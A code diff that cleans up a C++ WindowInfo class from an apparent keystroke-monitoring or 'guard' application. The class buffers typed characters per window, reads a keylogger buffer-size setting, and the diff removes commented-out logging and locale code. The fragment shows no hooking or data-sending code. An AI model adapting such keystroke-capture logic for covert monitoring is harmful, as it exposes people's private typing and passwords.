@@ -1,22 +1,12 @@
 ﻿#include "WindowInfo.h"
 
 
-WindowInfo::WindowInfo(/*Poco::Util::Application* _app, */std::wstring title, IGuardProcessor* processor) : /*app(_app), */guard(processor) {
+WindowInfo::WindowInfo(std::wstring title, IGuardProcessor* processor) : guard(processor) {
     this->title = title;
     loggerApp = AppContainer::instance().appLogger();
     logger = AppContainer::instance().keyLogger();
-    //logger = &Poco::Logger::get("KeyLogger");
-    //logger = &Poco::Logger::get("AppLogger");
-    //loggerApp = &Poco::Logger::get("AppLogger");
     wordbuffer = AppContainer::instance().config()->getInt("application.keylogger.wordbuffer", 2048);
-    //wchar_t BOM = static_cast<wchar_t>(0xFEFF);
-    //std::locale loc(std::locale(), new std::codecvt_utf16<wchar_t>);
-    //std::locale loc(std::locale(), new std::codecvt<wchar_t, char, std::mbstate_t>);
-    //std::locale loc("");
-    //stream.imbue(loc);
-    //stream << BOM;
     caret = 0;
-    //countWords = 0;
 }
 std::string WindowInfo::wstringToString(std::wstring str) {
     std::string _title;
@@ -61,15 +51,12 @@ void WindowInfo::removeChar(int direction) {
         if (s.size() == 0)caret = 0;
     }
     else {
-        std::string str("WindowInfo::removeChar(): ");
-        //loggerApp->error(str + "Error: Direction");
         throw std::runtime_error("Error: Direction");
     }
-    loggerApp->debug("WindowInfo::beforeRemoveChar(): " + wstringToString(stream.str()));
     stream.str(std::wstring());
     stream.clear();
     stream << s; // записываем измененную строку обратно в поток
-    //loggerApp->debug("WindowInfo::afterRemoveChar(): " + wstringToString(stream.str()));
+
 }
 
 void WindowInfo::addChar(std::wstring str) {
